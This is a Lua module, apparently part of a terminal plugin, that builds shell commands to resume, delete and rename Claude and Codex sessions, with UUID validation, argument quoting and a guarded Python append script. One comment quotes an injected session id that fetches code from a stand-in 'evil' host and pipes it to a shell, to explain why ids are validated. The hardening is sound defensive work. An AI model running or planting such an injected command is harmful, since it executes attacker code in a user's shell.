-- Mutating operations on sessions: resume, rename and delete. Everything here
-- goes through the shell because the Lua sandbox opens no `io` and strips
-- `os.remove`.

local sh = require("sh")

local M = {}

local quote = sh.quote

-- Returns nil when the id is not a UUID. Everything downstream treats that as
-- "this session cannot be acted on": the string would otherwise be typed
-- straight into the user's interactive shell by terminalis.send, where a
-- planted id like `x; curl evil | sh` would simply run.
function M.resume_command(session)
    if not sh.is_session_id(session.id) then return nil end
    if session.agent == "codex" then
        return "codex resume " .. session.id
    end
    return "claude --resume " .. session.id
end

-- Delete. Codex owns more state than the transcript — a session index and a
-- thread-history database — so its own CLI runs first, and removing the file is
-- only the fallback for whatever it left behind.
function M.delete(session)
    if session.agent == "codex" then
        -- `codex delete` takes the id as a positional argument, and its flags
        -- include --remote/--remote-auth-token-env. A quoted id still reaches
        -- the argument parser, so a non-UUID id is refused outright rather
        -- than allowed to pose as an option.
        if not sh.is_session_id(session.id) then
            return false, "el id de la sesión no es un UUID; no se ejecuta codex delete"
        end
        return sh.run(table.concat({
            "out=$(codex delete " .. quote(session.id) .. " </dev/null 2>&1)",
            "codex_rc=$?",
            "rm -f " .. quote(session.file),
            "rm_rc=$?",
            '[ "$codex_rc" -eq 0 ] || echo "codex delete: $out"',
            '[ "$rm_rc" -eq 0 ] || echo "no se pudo borrar el transcript"',
            '[ "$codex_rc" -eq 0 ] && [ "$rm_rc" -eq 0 ]',
        }, "\n"), 40)
    end
    return sh.run("rm -f " .. quote(session.file))
end

-- Claude stores the user-assigned title as a `custom-title` record inside the
-- transcript and honours the last one in the file, so renaming is an append.
-- Codex keeps its thread name in an index that its CLI rewrites wholesale, so
-- there is no equally safe equivalent and the alias stays plugin-local.
local APPLY_TITLE = [==[
python3 - <<'PYEOF'
import json, os, stat, sys

path  = os.environ["TT_SESSION_FILE"]
title = os.environ["TT_TITLE"]
sid   = os.environ["TT_SESSION_ID"]

root = os.path.abspath(os.path.expanduser("~/.claude/projects"))
absolute_path = os.path.abspath(path)

try:
    if os.path.commonpath((root, absolute_path)) != root:
        raise ValueError("ruta fuera del directorio de sesiones")
    parts = os.path.relpath(absolute_path, root).split(os.sep)
    if len(parts) != 2 or any(part in ("", ".", "..") for part in parts):
        raise ValueError("ruta de transcript no válida")

    root_fd = os.open(root, os.O_RDONLY | os.O_DIRECTORY)
    try:
        project_fd = os.open(parts[0], os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW,
                             dir_fd=root_fd)
        try:
            fd = os.open(parts[1], os.O_RDWR | os.O_APPEND | os.O_NOFOLLOW,
                         dir_fd=project_fd)
        finally:
            os.close(project_fd)
    finally:
        os.close(root_fd)
except (OSError, ValueError):
    sys.stderr.write("no se pudo abrir el transcript de forma segura\n")
    raise SystemExit(1)

if not stat.S_ISREG(os.fstat(fd).st_mode):
    os.close(fd)
    sys.stderr.write("el transcript no es un archivo regular\n")
    raise SystemExit(1)

with os.fdopen(fd, "r+b") as fh:
    fh.seek(0, os.SEEK_END)
    if fh.tell() > 0:
        fh.seek(-1, os.SEEK_END)
        if fh.read(1) != b"\n":
            fh.seek(0, os.SEEK_END)
            fh.write(b"\n")
    record = {"type": "custom-title", "customTitle": title, "sessionId": sid}
    fh.write((json.dumps(record, ensure_ascii=False) + "\n").encode("utf-8"))
PYEOF
]==]

function M.apply_claude_title(session, title)
    if session.agent ~= "claude" then
        return false, "sólo Claude admite renombrar dentro del agente"
    end
    local env = table.concat({
        "TT_SESSION_FILE=" .. quote(session.file),
        "TT_SESSION_ID=" .. quote(session.id),
        "TT_TITLE=" .. quote(title),
    }, " ")
    return sh.run(env .. " " .. APPLY_TITLE, 15)
end

return M
